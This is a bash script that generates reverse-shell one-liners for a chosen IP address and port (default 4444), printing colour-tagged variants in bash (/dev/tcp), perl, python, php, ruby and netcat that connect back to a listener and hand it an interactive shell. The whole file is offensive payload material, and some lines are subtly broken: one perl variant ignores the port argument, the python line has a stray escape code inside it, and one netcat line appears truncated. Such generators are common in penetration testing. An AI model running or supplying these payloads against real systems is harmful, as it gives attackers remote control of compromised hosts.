#!/bin/bash

while getopts i:p: flag
do
	case "${flag}" in
		i) ip_addr=${OPTARG};;
		p) port=${OPTARG};;
	esac
done

if [ -z "$port" ]
then
	port=4444
fi	

if [ -z "$ip_addr" ]
then
	ip_addr="192.168.1.1"
fi

echo -e "\e[41m[bash]\e[0m bash -i >& /dev/tcp/$ip_addr/$port 0>&1"
echo -e "\e[41m[bash]\e[0m 0<&196;exec 196<>/dev/tcp/$ip_addr/$port; sh <&196 >&196 2>&196"
echo -e "\e[41m[bash]\e[0m exec 5<>/dev/tcp/$ip_addr/$port | cat <&5 | while read line; do $line 2>&5 >&5; done"
echo -e "\e[42m[perl]\e[0m perl -e 'use Socket;\$i=\"$ip_addr\";\$p=1234;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in(\$p,inet_aton(\$i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");};'"
echo -e "\e[42m[perl]\e[0m perl -MIO -e '\$p=fork;exit,if(\$p);\$c=new IO::Socket::INET(PeerAddr,\"$ip_addr:$port\");STDIN->fdopen(\$c,r);$~->fdopen(\$c,w);system\$_ while<>;'"
echo -e "\e[42m[perl]\e[0m\e[47m[win]\e[0m perl -MIO -e '\$c=new IO::Socket::INET(PeerAddr,\"$ip_addr:$port\");STDIN->fdopen(\$c,r);$~->fdopen(\$c,w);system\$_ while<>;'"
echo -e "\e[43m[python]\e[0m python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"$ip_addr\",$port));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]\e[0m);'"
echo -e "\e[44m[php]\e[0m php -r '\$sock=fsockopen(\"$ip_addr\",$port);exec(\"/bin/sh -i \<\&3 \>\&3 2\>\&3\");'"
echo -e "\e[45m[ruby]\e[0m ruby -rsocket -e'f=TCPSocket.open(\"$ip_addr\",$port).to_i;exec sprintf(\"/bin/sh -i <&%d >&%d 2>&%d\",f,f,f)'"
echo -e "\e[45m[ruby]\e[0m ruby -rsocket -e 'exit if fork;c=TCPSocket.new(\"$ip_addr\",\"$port\");while(cmd=c.gets);IO.popen(cmd,\"r\"){|io|c.print io.read}end'"
echo -e "\e[45m[ruby]\e[0m ruby -rsocket -e 'c=TCPSocket.new(\"$ip_addr\",\"$port\");while(cmd=c.gets);IO.popen(cmd,\"r\"){|io|c.print io.read}end'"
echo -e "\e[46m[netcat]\e[0m nc -e /bin/sh $ip_addr $port"
echo -e "\e[46m[netcat]\e[0m nc -c /bin/sh $ip_addr $port"
echo -e "\e[46m[netcat]\e[0m /bin/sh | nc $ip_addr $port"
echo -e "\e[46m[netcat]\e[0m rm -f /tmp/p; mknod /tmp/p p && nc $ip_addr $port 0/tmp/p"
echo -e "\e[46m[netcat]\e[0m rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc $ip_addr $port >/tmp/f"

